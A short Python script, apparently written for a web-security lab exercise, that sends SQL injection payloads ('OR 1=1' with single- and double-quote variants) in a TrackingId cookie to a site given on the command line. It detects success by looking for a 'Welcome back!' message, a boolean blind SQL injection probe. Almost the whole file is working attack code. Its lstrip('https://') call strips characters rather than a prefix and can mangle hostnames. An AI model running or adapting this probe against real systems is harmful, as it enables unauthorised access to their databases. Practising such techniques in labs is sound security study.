import urllib.parse

import requests
import sys
from bs4 import BeautifulSoup

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

url = f'https://{site}/'


def try_query(query):
    print(f'Query: {query}')
    my_cookies = {'TrackingId': urllib.parse.quote_plus(query)}
    resp = requests.get(url, cookies=my_cookies)
    soup = BeautifulSoup(resp.text, 'html.parser')
    if soup.find('div', text='Welcome back!'):
        return True
    else:
        return False


print(try_query("""x' OR 1=1 --"""))
print(try_query("""x" OR 1=1 --"""))
